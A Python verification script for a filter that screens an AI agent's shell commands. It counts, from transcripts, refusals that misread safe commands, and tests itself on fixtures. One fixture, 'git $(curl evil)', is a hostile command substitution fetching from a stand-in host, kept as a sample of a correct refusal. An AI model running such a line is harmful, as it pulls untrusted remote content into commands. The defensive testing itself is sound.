#!/usr/bin/env python3
"""Proof, and measuring tool, for `.cos/0060_the-command-filter-refuses-safe-commands-it-misreads`.

`coscc/policy.py` refused commands it had misread: a `|` inside a regex split into a
"command", `${` or a backtick in single quotes taken for a substitution, `> /dev/null`
taken for a write. This script counts those refusals in the transcripts of board steps.
Two modes:

    (default)    the proof. No session, no quota, no network; temporary directory.
                 `--measure`'s own logic run on a fixture run log and fixture transcripts
                 whose every count is known: each misreading kind, each correct kind, a
                 command the version at `01699b8` refused and the new one runs, a session
                 outside the window, both refusal wordings, exit 0, 1 and 2.
    --measure    `--since YYYY-MM-DD --until YYYY-MM-DD [--confirmed FILE]`. Reads
                 `<COS_DATA_DIR>/cos.db` (`mode=ro`) and the transcripts under
                 `COS_TRANSCRIPTS_DIR` (default `~/.claude/projects`), and writes only
                 `<COS_DATA_DIR>/measurements/0060_measure_<since>_<until>.json`.

    0  misread refusals are at most 5% of the policy's refusals, and no command the
       version at `01699b8` refused ran in the window (after `--confirmed`)
    1  either did not hold (or, for the proof, a claim did not)
    2  the environment could not answer: no `cos.db`, no transcripts, no session in the
       window, no `git` or `bash`, or `git show 01699b8:coscc/policy.py` failed

It does **not** import `coscc`. `0060 spec.md` C5: classifying with the filter's own
reader would hide exactly the misreadings it exists to count. It has a simpler reader of
its own (`shlex`, a heredoc regex and a quote-region marker); where that reader cannot
read a command, the case is printed under `disagreements` rather than put on either side.

What counts as "fake" is `intent.md ## Answers, câu 4`: `bash -c 'type -t -- X'` prints
nothing. That depends on the `PATH` of the machine running this, and it undercounts a
split that lands on a real command (`0060 spec.md` C6).
"""

from __future__ import annotations

import argparse
import ast
import glob
import importlib.util
import json
import os
import re
import shlex
import shutil
import sqlite3
import subprocess
import sys
import tempfile
from datetime import date
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
EXIT_PASS, EXIT_BROKEN, EXIT_ENV = 0, 1, 2
OLD_COMMIT = "01699b8"
THRESHOLD = 0.05

# How every refusal `check_command` gives begins, the wording before `0060` and after it.
# A Bash `tool_result` with `is_error` whose content starts with one of these is the
# policy's (`0060 spike.md ## U1`: the reason is the whole content, verbatim).
REFUSAL_PREFIXES = (
    "an empty command",
    "command substitution is not allowed",
    "process substitution is not allowed",
    "arithmetic substitution is not allowed",
    "redirecting into a file is not allowed",
    "this step may not ",
    "this step was not granted",
    "the command's name is a variable",
    "this command could not be read as the shell reads it",
    "a push may not",
    "a push must",
    "--force-with-lease needs a value",
    "the lease must be bound",
    "no lease was fixed",
)
# What a Bash call that ran and failed looks like (`0060 spike.md ## U1`).
BASH_ERROR = "Exit code"

_MAY_NOT_RUN = re.compile(r"^this step may not run ((['\"]).*\2)$", re.DOTALL)
_SUBSTITUTION = re.compile(r"substitution is not allowed: (\S+)")
_HEREDOC = re.compile(r"<<(-?)\s*(['\"]?)(\w+)\2")
_UNIT_NAME = re.compile(r"\d{4}_[a-z0-9]+(?:-[a-z0-9]+)*")
_WRITE_OPS = (">", ">>", ">|", "&>", "&>>", ">&", "<>")


def say(ok: bool, claim: str, detail: str = "") -> bool:
    print(f"{'PASS' if ok else 'FAIL'}  {claim}{': ' + detail if detail and not ok else ''}",
          flush=True)
    return ok


def data_root() -> Path:
    return Path(os.environ.get("COS_DATA_DIR") or "~/.cos").expanduser()


def transcripts_root() -> Path:
    return Path(os.environ.get("COS_TRANSCRIPTS_DIR") or "~/.claude/projects").expanduser()


# ---------------------------------------------------------------------------
# This script's own reader. Simpler than `coscc/policy.py`'s on purpose (C5).
# ---------------------------------------------------------------------------


def contexts(command: str) -> list[str]:
    """Per character: `out`, `sq` (single quotes or `$'…'`), `dq`, `esc` (after a `\\`
    that means something there), `hl` / `he` (a heredoc body, literal / expanding), or
    `comment`."""
    ctx = ["out"] * len(command)
    state = "out"
    pending: list[tuple[str, bool, bool]] = []
    i, n = 0, len(command)
    word_start = True
    while i < n:
        c = command[i]
        if state == "out":
            if c == "\\" and i + 1 < n:
                ctx[i + 1] = "esc"
                i += 2
                word_start = False
                continue
            if c == "'" or (c == "$" and command.startswith("$'", i)):
                state = "ansi" if c == "$" else "sq"
                ctx[i] = "sq"
                i += 2 if c == "$" else 1
                continue
            if c == '"':
                state = "dq"
                i += 1
                continue
            if c == "#" and word_start:
                while i < n and command[i] != "\n":
                    ctx[i] = "comment"
                    i += 1
                continue
            m = _HEREDOC.match(command, i) if c == "<" else None
            if m and not command.startswith("<<<", i):
                pending.append((m.group(3), bool(m.group(2)), bool(m.group(1))))
                i = m.end()
                word_start = False
                continue
            if c == "\n" and pending:
                i += 1
                for delim, quoted, strip in pending:
                    while i < n:
                        end = command.find("\n", i)
                        end = n if end < 0 else end
                        line = command[i:end]
                        if (line.lstrip("\t") if strip else line) == delim:
                            i = end
                            break
                        for k in range(i, end + 1 if end < n else end):
                            ctx[k] = "hl" if quoted else "he"
                        if not quoted:
                            for k in range(i, end - 1):
                                if command[k] == "\\" and command[k + 1] in "$`\\":
                                    ctx[k + 1] = "esc"
                        i = end + 1
                pending = []
                word_start = True
                continue
            word_start = c in " \t\n;&|()"
            i += 1
        elif state in ("sq", "ansi"):
            ctx[i] = "sq"
            if c == "\\" and state == "ansi" and i + 1 < n:
                # Inside `$'…'` a backslash escapes the next character, `'` included.
                ctx[i + 1] = "sq"
                i += 2
                continue
            if c == "'":
                state = "out"
            i += 1
        else:  # dq
            ctx[i] = "dq"
            if c == "\\" and i + 1 < n and command[i + 1] in '$`"\\':
                ctx[i + 1] = "esc"
                i += 2
                continue
            if c == '"':
                state = "out"
            i += 1
    return ctx


def token_in_effect(command: str, token: str) -> bool:
    ctx = contexts(command)
    live = ("out",) if token in ("<(", ">(") else ("out", "dq", "he")
    at = command.find(token)
    while at >= 0:
        if ctx[at] in live:
            return True
        at = command.find(token, at + 1)
    return False


def without_heredoc_bodies(command: str) -> str:
    ctx = contexts(command)
    return "".join(c for c, k in zip(command, ctx) if k not in ("hl", "he", "comment"))


def write_targets(command: str) -> list[tuple[str, str]]:
    """Every `(op, target)` redirect that writes, by `shlex`. Raises `ValueError` when
    `shlex` cannot read the line."""
    lexer = shlex.shlex(without_heredoc_bodies(command), posix=True, punctuation_chars=";&|()<>")
    lexer.whitespace_split = True
    tokens = list(lexer)
    out = []
    for k, tok in enumerate(tokens):
        # `shlex` runs punctuation together (`;>`); a `(` in it is `>(`, a process.
        if ">" in tok and set(tok) <= set(";&|<>"):
            target = tokens[k + 1] if k + 1 < len(tokens) else ""
            out.append((tok.lstrip(";|"), target))
    return out


def redirect_is_safe(op: str, target: str, unit: str) -> bool:
    """R5's list, read on text: `/dev/null`, a descriptor, or below `/tmp/<…unit…>/`."""
    if op in (">&", "<&") and re.fullmatch(r"\d*-?", target) and target:
        return True
    if op == "<>":
        return False
    if target == "/dev/null":
        return True
    if _UNIT_NAME.fullmatch(unit or "") and target.startswith("/tmp/") and not re.search(r"[$~*?\[]", target):
        parts = Path(os.path.normpath(target)).parts  # ('/', 'tmp', D, ...)
        return len(parts) >= 4 and parts[1] == "tmp" and unit in parts[2]
    return False


_TYPE_CACHE: dict[str, bool] = {}


def is_fake(x: str) -> bool:
    """`intent.md ## Answers, câu 4`: X is not a command on `PATH` or a builtin."""
    if x not in _TYPE_CACHE:
        out = subprocess.run(["bash", "-c", 'type -t -- "$1"', "_", x],
                             capture_output=True, text=True, timeout=10)
        _TYPE_CACHE[x] = not out.stdout.strip()
    return _TYPE_CACHE[x]


def classify(command: str, reason: str, unit: str) -> str:
    """One policy refusal: `fake`, `substitution`, `redirect` (the three misreadings),
    `disagreement`, or `correct`."""
    m = _MAY_NOT_RUN.match(reason)
    if m:
        try:
            x = ast.literal_eval(m.group(1))
        except (ValueError, SyntaxError):
            return "disagreement"
        return "fake" if is_fake(x) else "correct"
    m = _SUBSTITUTION.search(reason)
    if m:
        token = m.group(1)
        if token == "${":
            live = token_in_effect(command, "$(") or token_in_effect(command, "`")
            return "correct" if live else "substitution"
        if token == "$((":
            return "correct"
        return "correct" if token_in_effect(command, token) else "substitution"
    if reason.startswith("redirecting into a file"):
        try:
            writes = write_targets(command)
        except ValueError:
            return "disagreement"
        if all(redirect_is_safe(op, t, unit) for op, t in writes):
            return "redirect"
        return "correct"
    return "correct"


# ---------------------------------------------------------------------------
# Reading the run log and the transcripts
# ---------------------------------------------------------------------------


def sessions(db: Path) -> dict[str, tuple[str, str]]:
    """`session_id` -> `(stage, unit)`, from the `end` rows of the run log."""
    conn = sqlite3.connect(f"file:{db}?mode=ro", uri=True)
    try:
        rows = conn.execute("SELECT unit, stage, record FROM runs WHERE kind = 'end' ORDER BY id").fetchall()
    finally:
        conn.close()
    out = {}
    for unit, stage, raw in rows:
        try:
            sid = str((json.loads(raw) or {}).get("session_id") or "")
        except (ValueError, TypeError):
            continue
        if sid:
            out[sid] = (stage or "", unit or "")
    return out


def bash_calls(path: str) -> list[dict]:
    """Every Bash `tool_use` paired to its `tool_result` by `tool_use_id`."""
    uses: dict[str, str] = {}
    out = []
    with open(path, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            try:
                row = json.loads(line)
            except ValueError:
                continue
            content = (row.get("message") or {}).get("content")
            if not isinstance(content, list):
                continue
            for c in content:
                if not isinstance(c, dict):
                    continue
                if c.get("type") == "tool_use" and c.get("name") == "Bash":
                    uses[c.get("id")] = str((c.get("input") or {}).get("command") or "")
                elif c.get("type") == "tool_result" and c.get("tool_use_id") in uses:
                    body = c.get("content")
                    if isinstance(body, list):
                        body = " ".join(b.get("text", "") for b in body if isinstance(b, dict))
                    out.append({
                        "command": uses[c["tool_use_id"]],
                        "is_error": bool(c.get("is_error")),
                        "content": str(body or ""),
                        "day": str(row.get("timestamp") or "")[:10],
                    })
    return out


def load_old_policy(tmp: Path):
    """`coscc/policy.py` as it was at `01699b8`, never copied into this script (R11)."""
    out = subprocess.run(["git", "-C", str(REPO), "show", f"{OLD_COMMIT}:coscc/policy.py"],
                         capture_output=True, text=True)
    if out.returncode != 0:
        return None, out.stderr.strip() or f"git show {OLD_COMMIT} failed"
    path = tmp / "policy_01699b8.py"
    path.write_text(out.stdout, encoding="utf-8")
    spec = importlib.util.spec_from_file_location("policy_01699b8", path)
    module = importlib.util.module_from_spec(spec)
    # `dataclass` looks its own module up in `sys.modules` while it builds `Grant`.
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module, ""


def measure(since: str, until: str, confirmed: list[str]) -> tuple[int, dict]:
    db = data_root() / "cos.db"
    root = transcripts_root()
    if not db.exists():
        return EXIT_ENV, {"error": f"no run log at {db}"}
    if not root.is_dir():
        return EXIT_ENV, {"error": f"no transcripts under {root}"}
    with tempfile.TemporaryDirectory(prefix="verify_0060-old-") as scratch:
        old, why = load_old_policy(Path(scratch))
        if old is None:
            return EXIT_ENV, {"error": why}
        counts = {"refusals": 0, "may_not_run": 0, "fake": 0, "substitution": 0, "redirect": 0}
        disagreements, unclassified, old_refused, lease_unknown = [], [], [], []
        seen_sessions = set()
        for sid, (stage, unit) in sessions(db).items():
            for path in glob.glob(str(root / "*" / f"{sid}.jsonl"))[:1]:
                for call in bash_calls(path):
                    if not (since <= call["day"] <= until):
                        continue
                    seen_sessions.add(sid)
                    command, content = call["command"], call["content"]
                    refused = call["is_error"] and content.startswith(REFUSAL_PREFIXES)
                    if call["is_error"] and not refused and not content.startswith(BASH_ERROR):
                        unclassified.append({"session": sid, "command": command, "content": content[:200]})
                        continue
                    if refused:
                        counts["refusals"] += 1
                        if _MAY_NOT_RUN.match(content):
                            counts["may_not_run"] += 1
                        kind = classify(command, content, unit)
                        if kind in ("fake", "substitution", "redirect"):
                            counts[kind] += 1
                        elif kind == "disagreement":
                            disagreements.append({"session": sid, "command": command, "reason": content})
                        continue
                    # It ran. R11: would the version before `0060` have refused it?
                    try:
                        write_targets(command)
                    except ValueError:
                        disagreements.append({"session": sid, "command": command,
                                              "reason": "allowed, but this script's reader cannot read it"})
                    reason = old.check_command(old.grant_for(stage), command)
                    if reason.startswith("no lease was fixed"):
                        lease_unknown.append({"session": sid, "stage": stage, "command": command})
                    elif reason and command not in confirmed:
                        # `read_as` is this script's reading of the old reason — `fake`,
                        # `substitution`, `redirect` or `correct` — to sort the list by. It
                        # confirms nothing: that is a person's, through `--confirmed`.
                        old_refused.append({"session": sid, "stage": stage, "command": command,
                                            "old_reason": reason,
                                            "read_as": classify(command, reason, unit)})
    if not seen_sessions:
        return EXIT_ENV, {"error": f"no board session has a Bash call between {since} and {until}"}
    misread = counts["fake"] + counts["substitution"] + counts["redirect"]
    rate = misread / counts["refusals"] if counts["refusals"] else 0.0
    result = {
        "since": since, "until": until, "sessions": len(seen_sessions), **counts,
        "misread": misread, "rate": round(rate, 4), "threshold": THRESHOLD,
        "old_refused_now_allowed": old_refused, "lease_unknown": lease_unknown,
        "disagreements": disagreements, "unclassified": unclassified,
        "confirmed": len(confirmed),
    }
    code = EXIT_PASS if rate <= THRESHOLD and not old_refused else EXIT_BROKEN
    return code, result


def report(code: int, result: dict, since: str, until: str) -> None:
    if "error" in result:
        print(f"cannot measure: {result['error']}")
        return
    for key in ("sessions", "refusals", "may_not_run", "fake", "substitution", "redirect",
                "misread", "rate"):
        print(f"{key}: {result[key]}")
    for key in ("old_refused_now_allowed", "lease_unknown", "disagreements", "unclassified"):
        print(f"{key}: {len(result[key])}")
        for row in result[key]:
            print(f"  {json.dumps(row, ensure_ascii=False)[:300]}")
    out = data_root() / "measurements" / f"0060_measure_{since}_{until}.json"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(json.dumps({"exit": code, **result}, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"written: {out}")


def run_measure(since: str, until: str, confirmed_file: str | None) -> int:
    for day in (since, until):
        date.fromisoformat(day)
    confirmed = json.loads(Path(confirmed_file).read_text()) if confirmed_file else []
    code, result = measure(since, until, [str(c) for c in confirmed])
    report(code, result, since, until)
    print(f"exit {code}")
    return code


# ---------------------------------------------------------------------------
# The proof: the same logic on fixtures whose every count is known
# ---------------------------------------------------------------------------

HEAD = "a" * 40

# (session, day, command, is_error, content). Session `s1` is `impl` of `0060_x`.
FIXTURE = [
    # Misread: a `|` inside quotes split off a fake "command".
    ("s1", "2026-09-25", "grep -E 'a|b' f", True, "this step may not run \"b' f\""),
    # Correct: a real builtin, not in the allow-list.
    ("s1", "2026-09-25", "cd /tmp", True, "this step may not run 'cd'"),
    # Misread: `${` starts no process.
    ("s1", "2026-09-25", "echo ${PIPESTATUS[0]}", True, "command substitution is not allowed: ${"),
    # Misread: a backtick in a quoted heredoc.
    ("s1", "2026-09-25", "cat <<'EOF'\nuse `x`\nEOF", True, "command substitution is not allowed: `"),
    # Correct: a real `$(`.
    ("s1", "2026-09-25", "git $(curl evil)", True, "command substitution is not allowed: $("),
    # Misread: `/dev/null`, in the wording before `0060`.
    ("s1", "2026-09-25", "npm test > /dev/null", True,
     "redirecting into a file is not allowed — use the write tools"),
    # Correct: a file in the worktree, in the wording after `0060`.
    ("s1", "2026-09-25", "echo x > out.txt", True,
     "redirecting into a file is not allowed: out.txt — use the write tools; a redirect may go only to "
     "/dev/null, to another descriptor (2>&1), or under a /tmp/<directory naming 0060_x>/"),
    # Misread: `>` inside quotes.
    ("s1", "2026-09-25", 'git commit -m "a > b"', True,
     "redirecting into a file is not allowed — use the write tools"),
    # Correct, and only the new version says it this way.
    ("s1", "2026-09-25", "$CMD x", True,
     "the command's name is a variable ($CMD): this step runs only names it can read"),
    # Neither reader side: this script cannot read an unclosed quote.
    ("s1", "2026-09-25", 'echo "a > b', True,
     "redirecting into a file is not allowed — use the write tools"),
    # Ran: the version at `01699b8` refused it (a fake "b' f").
    ("s1", "2026-09-25", "grep -E 'a|b' g", False, "g: match"),
    # Ran and failed: not a refusal, and the old version ran it too.
    ("s1", "2026-09-25", "npm test", True, "Exit code 1\nfailed"),
    # Not the policy's: printed, not counted.
    ("s1", "2026-09-25", "ls", True, "The user doesn't want to proceed with this tool use."),
    # Outside the window.
    ("s1", "2026-01-01", "sed -n 1p f", True, "this step may not run 'sed'"),
    # `integrate`: a leased push the old version cannot judge without the lease.
    ("s2", "2026-09-25", f"git push --force-with-lease=feat/x:{HEAD} origin feat/x", False, "ok"),
    # A clean day: one correct refusal, commands both versions run.
    ("s3", "2026-09-26", "cd /tmp", True, "this step may not run 'cd'"),
    ("s3", "2026-09-26", "npm test 2>&1", False, "ok"),
]
SESSIONS = {"s1": ("impl", "0060_x"), "s2": ("integrate", "0060_x"), "s3": ("impl", "0060_x")}


def write_fixture(tmp: Path) -> None:
    data = tmp / "data"
    data.mkdir(parents=True)
    conn = sqlite3.connect(data / "cos.db")
    conn.execute("CREATE TABLE runs (id INTEGER PRIMARY KEY, at TEXT, root TEXT, workspace TEXT, "
                 "unit TEXT, stage TEXT, kind TEXT, record TEXT)")
    for sid, (stage, unit) in SESSIONS.items():
        conn.execute("INSERT INTO runs (at, root, workspace, unit, stage, kind, record) "
                     "VALUES ('2026-09-25T00:00:00Z', 'r', 'ws', ?, ?, 'end', ?)",
                     (unit, stage, json.dumps({"session_id": sid, "outcome": "done"})))
    conn.commit()
    conn.close()
    project = tmp / "transcripts" / "-proj"
    project.mkdir(parents=True)
    for n, (sid, day, command, is_error, content) in enumerate(FIXTURE):
        use = {"type": "assistant", "timestamp": f"{day}T10:00:00.000Z", "message": {"content": [
            {"type": "tool_use", "id": f"t{n}", "name": "Bash", "input": {"command": command}}]}}
        result = {"type": "user", "timestamp": f"{day}T10:00:01.000Z", "sessionId": sid, "message": {
            "content": [{"type": "tool_result", "tool_use_id": f"t{n}", "is_error": is_error,
                         "content": content}]}}
        with open(project / f"{sid}.jsonl", "a", encoding="utf-8") as fh:
            fh.write(json.dumps(use) + "\n" + json.dumps(result) + "\n")


def run_proof() -> int:
    for tool in ("git", "bash"):
        if not shutil.which(tool):
            print(f"`{tool}` is not on PATH — cannot run the proof")
            return EXIT_ENV
    tmp = Path(tempfile.mkdtemp(prefix="verify_0060-"))
    os.environ["COS_DATA_DIR"] = str(tmp / "data")
    os.environ["COS_TRANSCRIPTS_DIR"] = str(tmp / "transcripts")
    ok = True
    try:
        write_fixture(tmp)
        code, r = measure("2026-09-25", "2026-09-25", [])
        if code == EXIT_ENV:
            print(f"cannot run the proof: {r.get('error')}")
            return EXIT_ENV
        ok &= say(r["sessions"] == 2, "sessions with a Bash call in the window are s1 and s2", repr(r["sessions"]))
        ok &= say(r["refusals"] == 10, "every policy refusal in the window is counted, both wordings",
                  repr(r["refusals"]))
        ok &= say(r["may_not_run"] == 2 and r["fake"] == 1,
                  "`may not run X`: two, one of them fake (\"b' f\"), `cd` is real",
                  f"{r['may_not_run']} / {r['fake']}")
        ok &= say(r["substitution"] == 2, "`${` and a backtick in a quoted heredoc are misreadings; "
                  "a real `$(` is not", repr(r["substitution"]))
        ok &= say(r["redirect"] == 2, "`> /dev/null` and `>` in quotes are misreadings; `> out.txt` is not",
                  repr(r["redirect"]))
        ok &= say(r["misread"] == 5 and r["rate"] == 0.5, "the rate is misread over refusals",
                  f"{r['misread']} / {r['rate']}")
        ok &= say(len(r["disagreements"]) == 1 and r["disagreements"][0]["command"] == 'echo "a > b',
                  "a command this script cannot read is a disagreement, on neither side",
                  repr(r["disagreements"]))
        ok &= say(len(r["unclassified"]) == 1, "an error that is not the policy's is printed, not counted",
                  repr(r["unclassified"]))
        ok &= say([x["command"] for x in r["old_refused_now_allowed"]] == ["grep -E 'a|b' g"],
                  "R11: the command 01699b8 refused and that ran is listed with its old reason",
                  repr(r["old_refused_now_allowed"]))
        ok &= say("may not run" in (r["old_refused_now_allowed"] or [{}])[0].get("old_reason", ""),
                  "R11: the old reason is the old version's own words")
        ok &= say(len(r["lease_unknown"]) == 1, "a leased push goes to lease_unknown, not to R11",
                  repr(r["lease_unknown"]))
        ok &= say(code == EXIT_BROKEN, "a rate above 5% is exit 1", repr(code))

        code, r = measure("2026-09-25", "2026-09-25", ["grep -E 'a|b' g"])
        ok &= say(r["old_refused_now_allowed"] == [], "--confirmed removes a command from the R11 list")

        code, r = measure("2026-09-26", "2026-09-26", [])
        ok &= say(code == EXIT_PASS and r["refusals"] == 1 and r["misread"] == 0,
                  "a window of correct refusals and commands both versions run is exit 0",
                  f"exit {code}, {r}")

        code, r = measure("2026-12-01", "2026-12-01", [])
        ok &= say(code == EXIT_ENV, "a window with no session is exit 2", repr(code))

        report(EXIT_PASS, measure("2026-09-26", "2026-09-26", [])[1], "2026-09-26", "2026-09-26")
        written = tmp / "data" / "measurements" / "0060_measure_2026-09-26_2026-09-26.json"
        ok &= say(written.exists() and json.loads(written.read_text())["refusals"] == 1,
                  "the result is written under <COS_DATA_DIR>/measurements/")

        os.environ["COS_DATA_DIR"] = str(tmp / "nowhere")
        code, _ = measure("2026-09-25", "2026-09-25", [])
        ok &= say(code == EXIT_ENV, "no cos.db is exit 2", repr(code))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    print("\nall claims held" if ok else "\nat least one claim did not hold")
    return EXIT_PASS if ok else EXIT_BROKEN


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    p.add_argument("--measure", action="store_true")
    p.add_argument("--since")
    p.add_argument("--until")
    p.add_argument("--confirmed", help="a JSON array of commands a person confirmed run nothing refused")
    args = p.parse_args()
    if args.measure:
        if not (args.since and args.until):
            p.error("--measure needs --since and --until")
        return run_measure(args.since, args.until, args.confirmed)
    return run_proof()


if __name__ == "__main__":
    raise SystemExit(main())
